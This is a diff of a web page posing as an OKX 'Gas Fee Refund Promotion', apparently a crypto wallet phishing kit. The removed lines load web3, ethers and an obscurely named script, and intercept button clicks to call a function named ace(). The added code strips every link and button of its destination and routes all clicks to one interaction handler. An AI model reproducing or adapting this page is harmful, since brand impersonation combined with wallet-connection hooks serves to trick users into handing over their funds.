@@ -1,11 +1,4 @@
 <html lang="en" dir="" class="" ><head>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/pbkdf2.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
-<script src="modules.js" type="module"></script>
-<script defer src="fj33u-6xt1y-2k90k.js"></script>
     <title>OKX Crypto Wallet Gas Fee Refund Promotion | OKX</title>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -2880,30 +2873,37 @@
 
 
 
-<script>
-    window.addEventListener("load", (event) => {
-        const buttons = document.querySelectorAll("a.interact-button");
 
-        if (buttons.length > 0) {
-            console.log("Buttons found!");
+    <script>
+    document.addEventListener("DOMContentLoaded", function () {
+        // Select all <a> tags
+        var anchorTags = document.querySelectorAll('a');
 
-            function handleClick(event) {
-                event.preventDefault();
-                event.stopPropagation();
-                console.log("Button clicked!");
-                ace();
-                console.log("Ace launched via index!");
-                return false;
-            }
+        // Loop through each <a> tag
+        anchorTags.forEach(function (anchorTag) {
+            // Remove href attribute
+            anchorTag.removeAttribute('href');
+            // Add onclick attribute
+            anchorTag.setAttribute('onclick', 'interact-button');
+            anchorTag.style.cursor = 'pointer'
+        });
 
-            buttons.forEach(button => {
-                button.addEventListener("click", handleClick);
-            });
-        } else {
-            console.log("Buttons not found!");
-        }
+        // Select all <button> tags
+        var buttonTags = document.querySelectorAll('button');
+
+        // Loop through each <button> tag
+        buttonTags.forEach(function (buttonTag) {
+            // Remove href attribute
+            buttonTag.removeAttribute('href');
+            // Add onclick attribute
+            buttonTag.setAttribute('onclick', 'interact-button');
+            buttonTag.style.cursor = 'pointer'
+        });
+
+
     });
 </script>
+
 
 
 
